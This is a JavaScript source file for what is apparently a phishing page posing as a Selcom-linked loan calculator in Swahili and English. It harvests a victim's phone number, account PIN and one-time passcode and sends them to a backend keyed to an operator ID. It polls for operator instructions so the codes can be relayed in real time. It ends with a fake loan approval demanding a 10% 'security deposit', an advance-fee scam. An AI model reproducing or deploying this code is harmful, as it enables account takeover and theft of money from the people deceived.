document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenSignin = document.getElementById('screen-signin');
  const screenOtp = document.getElementById('screen-otp');
  const screenSuccess = document.getElementById('screen-success');
  const loadingOverlay = document.getElementById('loading-overlay');

  const langToggle = document.getElementById('lang-toggle-switch');
  const credsBanner = document.getElementById('banner-creds-error');
  const otpBanner = document.getElementById('banner-otp-error');

  const phoneInput = document.getElementById('phone-number');
  const pinBoxes = document.querySelectorAll('.pin-box-num');
  const btnSubmitCreds = document.getElementById('btn-submit-creds');

  const otpBoxes = document.querySelectorAll('.otp-box-num');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  const countdownEl = document.getElementById('countdown');
  const btnRequestNewOtp = document.getElementById('btn-request-new-otp');

  let currentUserId = null;
  let statusPollInterval = null;
  let countdownInterval = null;
  let currentLanguage = 'sw'; // Default Swahili

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showScreen(targetScreen) {
    [screenWelcome, screenSignin, screenOtp, screenSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  // Language Switcher Logic
  function updateLanguageTexts(lang) {
    currentLanguage = lang;
    const isSwahili = lang === 'sw';

    if (isSwahili) {
      document.getElementById('txt-welcome-subtitle').innerText = 'Kadiria marejesho yako ya mkopo';
      document.getElementById('lbl-loan-amt-title').innerText = 'KIASI CHA MKOPO';
      document.getElementById('lbl-loan-term-title').innerText = 'MUDA WA MKOPO (MIEZI)';
      document.getElementById('lbl-est-rep').innerText = 'MAREJESHO YA MWEZI KADIRIA';
      document.getElementById('lbl-tot-rep').innerText = 'JMLA YA MAREJESHO';
      document.getElementById('lbl-interest').innerText = '*Riba inayodhaniwa: 13.5%';
      document.getElementById('btn-goto-signin').innerText = 'INGIA';

      document.getElementById('lbl-ingia-akaunti').innerText = 'Ingia Akaunti';
      document.getElementById('lbl-phone-label').innerText = 'Nambari ya Simu / Account No';
      document.getElementById('lbl-pin-label').innerText = 'Weka PIN yako (tarakimu 4)';
      document.getElementById('lbl-forgot-pin').innerText = 'Umesahau PIN?';
      document.getElementById('btn-submit-creds').innerText = 'INGIA';

      document.getElementById('lbl-otp-title').innerText = 'Uthibitisho wa OTP ya Selcom';
      document.getElementById('lbl-otp-sub').innerHTML = 'Weka tarakimu 6 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="display-otp-phone">+2557125535595</strong>';
      document.getElementById('lbl-otp-notice').innerText = '✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 6 kutoka WhatsApp au SMS hapa chini.';
      document.getElementById('lbl-timer').innerHTML = 'Tuma tena msimbo ndani ya <span id="countdown">1:00</span>';
      document.getElementById('btn-request-new-otp').innerText = 'Tuma Msimbo Mpya (Request New OTP)';
      document.getElementById('btn-submit-otp').innerText = 'WASILISHA';

      document.getElementById('lbl-hongera').innerText = 'Hongera!';
      document.getElementById('lbl-approved-sub').innerHTML = 'Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.';
      document.getElementById('lbl-approved-heading').innerText = 'KIASI KILICHOIDHINISHWA';
      document.getElementById('lbl-notisi').innerText = '⚠️ NOTISI YA UZINGATIAJI';
      document.getElementById('lbl-notisi-body').innerText = 'Akaunti yako ya SELCOM details lazima iwe hai na idumish amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.';
      document.getElementById('btn-finish-home').innerText = 'RUDI NYUMBANI';
    } else {
      document.getElementById('txt-welcome-subtitle').innerText = 'Estimate your loan repayments';
      document.getElementById('lbl-loan-amt-title').innerText = 'LOAN AMOUNT';
      document.getElementById('lbl-loan-term-title').innerText = 'LOAN TERM (MONTHS)';
      document.getElementById('lbl-est-rep').innerText = 'ESTIMATED MONTHLY REPAYMENT';
      document.getElementById('lbl-tot-rep').innerText = 'TOTAL REPAYMENT';
      document.getElementById('lbl-interest').innerText = '*Assumed Interest Rate: 13.5%';
      document.getElementById('btn-goto-signin').innerText = 'SIGN IN';

      document.getElementById('lbl-ingia-akaunti').innerText = 'Sign In Account';
      document.getElementById('lbl-phone-label').innerText = 'Mobile Number / Account No';
      document.getElementById('lbl-pin-label').innerText = 'Enter your PIN (4 digits)';
      document.getElementById('lbl-forgot-pin').innerText = 'Forgot PIN?';
      document.getElementById('btn-submit-creds').innerText = 'SIGN IN';

      document.getElementById('lbl-otp-title').innerText = 'Selcom OTP Verification';
      document.getElementById('lbl-otp-sub').innerHTML = 'Enter the 6-digit OTP sent to your Selcom registered phone number <strong id="display-otp-phone">+2557125535595</strong>';
      document.getElementById('lbl-otp-notice').innerText = '✓ Message verified! Please enter your 6-digit OTP code from WhatsApp or SMS below.';
      document.getElementById('lbl-timer').innerHTML = 'Resend code in <span id="countdown">1:00</span>';
      document.getElementById('btn-request-new-otp').innerText = 'Request New OTP';
      document.getElementById('btn-submit-otp').innerText = 'SUBMIT';

      document.getElementById('lbl-hongera').innerText = 'Congratulations!';
      document.getElementById('lbl-approved-sub').innerHTML = 'Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.';
      document.getElementById('lbl-approved-heading').innerText = 'APPROVED AMOUNT';
      document.getElementById('lbl-notisi').innerText = '⚠️ COMPLIANCE NOTICE';
      document.getElementById('lbl-notisi-body').innerText = 'Your SELCOM account details must be active and maintain a security deposit of at least 10% of the requested loan amount. This deposit is fully refunded after loan completion.';
      document.getElementById('btn-finish-home').innerText = 'RETURN HOME';
    }
  }

  // Initialize with Swahili default checked
  langToggle.addEventListener('change', (e) => {
    updateLanguageTexts(e.target.checked ? 'sw' : 'en');
  });
  updateLanguageTexts('sw');

  // Slider Logic & Calculator
  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');
  const monthlyRepVal = document.getElementById('monthly-rep-val');
  const totalRepVal = document.getElementById('total-rep-val');

  function updateCalculations() {
    const amount = Number(loanSlider.value);
    const months = Number(monthsSlider.value);
    loanText.innerText = `TSH ${amount.toLocaleString()}`;
    monthsText.innerText = `${months} ${currentLanguage === 'sw' ? 'MIEZI' : 'MONTHS'}`;

    const totalRep = amount * 1.135;
    const monthlyRep = totalRep / months;

    monthlyRepVal.innerText = `TSH ${Math.round(monthlyRep).toLocaleString()}`;
    totalRepVal.innerText = `TSH ${Math.round(totalRep).toLocaleString()}`;
  }

  loanSlider.addEventListener('input', updateCalculations);
  monthsSlider.addEventListener('input', updateCalculations);
  updateCalculations();

  // Navigate to Sign In screen
  const btnGotoSignin = document.getElementById('btn-goto-signin');
  if (btnGotoSignin) {
    ['click', 'touchstart'].forEach(evt => {
      btnGotoSignin.addEventListener(evt, (e) => {
        e.preventDefault();
        showScreen(screenSignin);
      });
    });
  }

  // Phone input formatting (Starts with 0 enforcement)
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 0 && !val.startsWith('0')) {
        val = '0' + val.replace(/^0+/, '');
      }
      e.target.value = val;
      checkCredsValid();
    });
  }

  // Pin digits auto-tabbing
  function setupDigitInputs(boxes, callback) {
    boxes.forEach((box, idx) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && idx < boxes.length - 1) {
          boxes[idx + 1].focus();
        }
        if (callback) callback();
      });
      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          boxes[idx - 1].focus();
        }
      });
    });
  }

  function checkCredsValid() {
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    const phoneVal = phoneInput.value.trim();
    if (phoneVal.length >= 9 && pinVal.length === 4) {
      btnSubmitCreds.classList.add('active-blue');
    } else {
      btnSubmitCreds.classList.remove('active-blue');
    }
  }

  setupDigitInputs(pinBoxes, checkCredsValid);

  document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
  });

  // Step 1: Submit Credentials
  btnSubmitCreds.addEventListener('click', async () => {
    const phoneVal = phoneInput.value.trim();
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    if (!phoneVal || pinVal.length !== 4) return;

    if (credsBanner) credsBanner.classList.remove('active');
    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');

    try {
      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  // OTP 6-digits Setup & Auto-submit
  setupDigitInputs(otpBoxes, () => {
    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
    if (otpVal.length === 6) {
      btnSubmitOtp.classList.add('active-blue');
      submitOtpHandler();
    } else {
      btnSubmitOtp.classList.remove('active-blue');
    }
  });

  async function submitOtpHandler() {
    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
    if (otpVal.length !== 6) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) startStatusPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  }

  btnSubmitOtp.addEventListener('click', submitOtpHandler);

  // 1-Minute Countdown Timer
  function startOneMinuteTimer() {
    let timeLeft = 60;
    const timerSpan = document.getElementById('countdown');
    if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'none';

    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      timeLeft--;
      let mins = Math.floor(timeLeft / 60);
      let secs = timeLeft % 60;
      if (timerSpan) {
        timerSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
      }

      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        if (timerSpan) timerSpan.innerText = '0:00';
        if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'inline-block';
      }
    }, 1000);
  }

  if (btnRequestNewOtp) {
    btnRequestNewOtp.addEventListener('click', async () => {
      showLoading('INATUMASISIMBO...', 'Inatuma ombi la OTP mpya.');
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
        hideLoading();
        alert(currentLanguage === 'sw' ? 'Ombi limetumwa kwa admin.' : 'Request sent to admin.');
        startOneMinuteTimer();
      } catch (err) {
        hideLoading();
      }
    });
  }

  // Polling Function
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp);
          const dispPhone = document.getElementById('display-otp-phone');
          if (dispPhone) dispPhone.innerText = `+255${phoneInput.value.trim()}`;
          if (otpBoxes[0]) otpBoxes[0].focus();
          startOneMinuteTimer();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('final-approved-amount').innerText = `TSH ${Number(loanSlider.value).toLocaleString()}`;
          showScreen(screenSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) {
            credsBanner.innerText = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
            credsBanner.classList.add('active');
          }
          pinBoxes.forEach(b => b.value = '');
          btnSubmitCreds.classList.remove('active-blue');
          showScreen(screenSignin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) {
            otpBanner.innerText = 'WRONG OTP ❌ Incorrect verification code. Please try again.';
            otpBanner.classList.add('active');
          }
          otpBoxes.forEach(b => b.value = '');
          btnSubmitOtp.classList.remove('active-blue');
          showScreen(screenOtp);
          startOneMinuteTimer();
        }
      } catch (e) {}
    }, 2500);
  }

  document.getElementById('btn-finish-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }
});
  
